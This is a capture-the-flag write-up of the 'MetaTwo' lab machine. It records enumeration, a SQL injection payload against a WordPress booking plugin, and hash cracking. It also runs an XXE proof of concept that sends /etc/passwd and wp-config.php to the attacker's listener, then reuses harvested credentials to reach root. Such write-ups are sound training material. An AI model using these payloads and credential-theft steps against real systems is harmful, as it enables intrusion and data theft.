## MetaTwo 

### Lab Details 

- Difficulty: Easy  
- Type:  Web App, WordPress, FTP, Passpie, Linux

#### Enumeration
- run nmap
```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp?    syn-ack
| fingerprint-strings: 
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPp9LmBKMOuXu2ZOpw8JorL5ah0sU0kIBXvJB8LX26rpbOhw+1MPdhx6ptZzXwQ8wkQc88xu5h+oB8NGkeHLYhvRqtZmvkTpOsyJiMm+0Udbg+IJCENPiKGSC5J+0tt4QPj92xtTe/f7WV4hbBLDQust46D1xVJVOCNfaloIC40BtWoMWIoEFWnk7U3kwXcM5336LuUnhm69XApDB4y/dt5CgXFoWlDQi45WLLQGbanCNAlT9XwyPnpIyqQdF7mRJ5yRXUOXGeGmoO9+JALVQIEJ/7Ljxts6QuV633wFefpxnmvTu7XX9W8vxUcmInIEIQCmunR5YH4ZgWRclT+6rzwRQw1DH1z/ZYui5Bjn82neoJunhweTJXQcotBp8glpvq3X/rQgZASSyYrOJghBlNVZDqPzp4vBC78gn6TyZyuJXhDxw+lHxF82IMT2fatp240InLVvoWrTWlXlEyPiHraKC0okOVtul6T0VRxsuT+QsyU7pdNFkn2wDVvC25AW8=
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB1ZmNogWBUF8MwkNsezebQ+0/yPq7RX3/j9s4Qh8jbGlmvAcN0Z/aIBrzbEuTRf3/cHehtaNf9qrF2ehQAeM94=
|   256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOP4kxBr9kumAjfplon8fXJpuqhdMJy2rpd3FM7+mGw2
80/tcp open  http    syn-ack nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://metapress.htb/
|_http-server-header: nginx/1.18.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.95%I=7%D=7/27%Time=6885FD3E%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,8F,"220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\
SF:.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
SF:ative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative
SF:\r\n");
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
```
- investigate port 80
    - port 80 has domain name `metapress.htb`
    - we are able to book event at `http://metapress.htb/events/`
    - enumerate directories
```
$ ffuf -u http://metapress.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -fc 301,302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://metapress.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301,302
________________________________________________

xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 1337ms]
wp-login.php            [Status: 200, Size: 6931, Words: 342, Lines: 97, Duration: 1853ms]
readme.html             [Status: 200, Size: 7278, Words: 740, Lines: 98, Duration: 2430ms]
.htaccess               [Status: 200, Size: 633, Words: 60, Lines: 21, Duration: 2974ms]
license.txt             [Status: 200, Size: 19915, Words: 3331, Lines: 385, Duration: 4822ms]
robots.txt              [Status: 200, Size: 113, Words: 5, Lines: 6, Duration: 4388ms]
wp-config.php           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2698ms]
wp-settings.php         [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 3434ms]
wp-mail.php             [Status: 403, Size: 2672, Words: 212, Lines: 121, Duration: 1543ms]
wp-cron.php             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3712ms]
wp-links-opml.php       [Status: 200, Size: 224, Words: 12, Lines: 12, Duration: 3570ms]
wp-load.php             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 5988ms]
```
- enumerate subdomain
```
$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.10.11.186 -H "HOST: FUZZ.metapress.htb"  -fc 302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.186
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.metapress.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 66 req/sec :: Duration: [0:11:11] :: Errors: 28 ::
```
- investigate port 21
	- attempted login using `anonymous` user
```
ftp 10.10.11.186                                                                                                                        
Connected to 10.10.11.186.
220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
Name (10.10.11.186:kali): anonymous
331 Password required for anonymous
Password: 
530 Login incorrect.
ftp: Login failed
ftp> exit
221 Goodbye.
```

#### Initial Foothold 
```
$ python3 ./booking-sqlinjector.py -u http://metapress.htb -nu http://metapress.htb/events/ -a -o db_dump -p ') UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users limit 1 offset {off}-- -'

████████████████████████████████████████████████████████████████████
█─▄▄▄▄█─▄▄▄─█▄─▄█████▄─▄█▄─▀█▄─▄███▄─▄█▄─▄▄─█─▄▄▄─█─▄─▄─█─▄▄─█▄─▄▄▀█
█▄▄▄▄─█─██▀─██─██▀████─███─█▄▀─██─▄█─███─▄█▀█─███▀███─███─██─██─▄─▄█
▀▄▄▄▄▄▀───▄▄▀▄▄▄▄▄▀▀▀▄▄▄▀▄▄▄▀▀▄▄▀▄▄▄▀▀▀▄▄▄▄▄▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▄▀▄▄▀▄▄▀
====================================================================
             █▀▀ █░█ █▀▀ ▄▄ ▀█ █▀█ ▀█ ▀█ ▄▄ █▀█ ▀▀█ █▀█
             █▄▄ ▀▄▀ ██▄ ░░ █▄ █▄█ █▄ █▄ ░░ █▄█ ░░█ ▀▀█
    
[*] DB Fingerprint: 10.5.15-MariaDB-0+deb11u1
[*] Users found: 2
{
  "admin": {
    "email": "admin@metapress.htb",
    "password": "$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV."
  },
  "manager": {
    "email": "manager@metapress.htb",
    "password": "$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70"
  }
}
```


```
$ hashid '$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70'
Analyzing '$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70'
[+] Wordpress ≥ v2.6.2 
[+] Joomla ≥ v2.5.18 
[+] PHPass' Portable Hash 


$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
partylikearockstar (?)     
1g 0:00:00:04 DONE (2025-07-27 06:58) 0.2150g/s 23741p/s 23741c/s 23741C/s poochini..onelove7
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 
```
- we can then login to the wordpress application as `manager`
#### Lateral Movement (If any)
- once we have logged in as `manager` the version of the application is stated on the front page which is version `5.6.2`
- search for PoC online found https://github.com/0xRar/CVE-2021-29447-PoC
- a XML vulnerability that we can use to access internal files 
- try getting `/etc/passwd`
```
$ python3 ./PoC.py -l 10.10.16.20 -p 9001 -f /etc/passwd              

    ╔═╗╦  ╦╔═╗     
    ║  ╚╗╔╝║╣────2021-29447
    ╚═╝ ╚╝ ╚═╝
    Written By (Isa Ebrahim - 0xRar) on January, 2023

    ═══════════════════════════════════════════════════════════════════════════
    [*] Title: Wordpress XML parsing issue in the Media Library leading to XXE
    [*] Affected versions: Wordpress 5.6 - 5.7
    [*] Patched version: Wordpress 5.7.1
    [*] Installation version: PHP 8
    ═══════════════════════════════════════════════════════════════════════════
    
[+] payload.wav was created.
[+] evil.dtd was created.
[+] manually upload the payload.wav file to the Media Library.
[+] wait for the GET request.

[Mon Jul 28 07:04:30 2025] PHP 8.4.4 Development Server (http://0.0.0.0:9001) started
[Mon Jul 28 07:04:41 2025] 10.10.11.186:50080 Accepted
[Mon Jul 28 07:04:42 2025] 10.10.11.186:50080 [200]: GET /evil.dtd
[Mon Jul 28 07:04:42 2025] 10.10.11.186:50080 Closing
[Mon Jul 28 07:04:43 2025] 10.10.11.186:50090 Accepted
[Mon Jul 28 07:04:43 2025] 10.10.11.186:50090 [404]: GET /?p=jVRNj5swEL3nV3BspUSGkGSDj22lXjaVuum9MuAFusamNiShv74zY8gmgu5WHtB8vHkezxisMS2/8BCWRZX5d1pplgpXLnIha6MBEcEaDNY5yxxAXjWmjTJFpRfovfA1LIrPg1zvABTDQo3l8jQL0hmgNny33cYbTiYbSRmai0LUEpm2fBdybxDPjXpHWQssbsejNUeVnYRlmchKycic4FUD8AdYoBDYNcYoppp8lrxSAN/DIpUSvDbBannGuhNYpN6Qe3uS0XUZFhOFKGTc5Hh7ktNYc+kxKUbx1j8mcj6fV7loBY4lRrk6aBuw5mYtspcOq4LxgAwmJXh97iCqcnjh4j3KAdpT6SJ4BGdwEFoU0noCgk2zK4t3Ik5QQIc52E4zr03AhRYttnkToXxFK/jUFasn2Rjb4r7H3rWyDj6IvK70x3HnlPnMmbmZ1OTYUn8n/XtwAkjLC5Qt9VzlP0XT0gDDIe29BEe15Sst27OxL5QLH2G45kMk+OYjQ+NqoFkul74jA+QNWiudUSdJtGt44ivtk4/Y/yCDz8zB1mnniAfuWZi8fzBX5gTfXDtBu6B7iv6lpXL+DxSGoX8NPiqwNLVkI+j1vzUes62gRv8nSZKEnvGcPyAEN0BnpTW6+iPaChneaFlmrMy7uiGuPT0j12cIBV8ghvd3rlG9+63oDFseRRE/9Mfvj8FR2rHPdy3DzGehnMRP+LltfLt2d+0aI9O9wE34hyve2RND7xT7Fw== - No such file or directory

$ php ../CVE-2021-29447-PoC/decode_etc_password.php 
<snip>
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```
- a user named `jnelson` has a login shell we can attempt to get the `/home/jnelson/.ssh/id_rsa` however it doesnt seem to exist
- tried getting the config file for `ftp` server at `/etc/vsftpd.conf` doesnt seem to have permission or exist
- tried to get `../wp_config.php`
```
$ php ../CVE-2021-29447-PoC/decode.php  
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
<snip>
```
- we get the `ftp` user's credentials
- login to `ftp` with `metapress.htb`
- there is a file named `send_email.php` that contains login credential for `jnelson` for `ssh`
```
$ cat ./send_email.php
<snip>
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   
<snip>
```
#### Privilege Escalation
- run `linpeas.sh` found below 
```
══╣ Possible private SSH keys were found!
/home/jnelson/.passpie/.keys
```
- `passpie` is a password manager for the command line 
- `.keys` file contains a pair of `PGP` private and public keys
```
jnelson@meta2:~/.passpie$ ls -la
total 24
dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 .
drwxr-xr-x 5 jnelson jnelson 4096 Jul 28 16:31 ..
-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys

jnelson@meta2:~/.passpie$ cat .keys 
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQSuBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
<snip>
-----END PGP PUBLIC KEY BLOCK-----
-----BEGIN PGP PRIVATE KEY BLOCK-----

lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1
AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD
<snip>
-----END PGP PRIVATE KEY BLOCK-----

```
- we can get it from remote using `scp` and decrypt it using `john`
- **NOTE**: we only need the private PGP key 
```
$: scp jnelson@10.10.11.186:/home/jnelson/.passpie/.keys ./keys

$ gpg2john keys_private > keys.hash 

File keys_private

$ john -wordlist=/usr/share/wordlists/rockyou.txt keys.hash --format=gpg

Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
blink182         (Passpie)     
1g 0:00:00:02 DONE (2025-07-28 09:16) 0.3448g/s 56.55p/s 56.55c/s 56.55C/s ginger..blink182
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
- dump the `passpie` database
```
## destination and filename of the exported file
jnelson@meta2:~$ passpie export ~/password.db

jnelson@meta2:~$ cat password.db 
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```
- change user using `su root` with the credential found in the `password.db`
```
jnelson@meta2:~$ su root
Password: 
root@meta2:/home/jnelson# whoami
root
```
#### Resources

#### Lesson Learned
- for web app, check source code for plugin version if directory and subdomain enumeration results in no findings. 
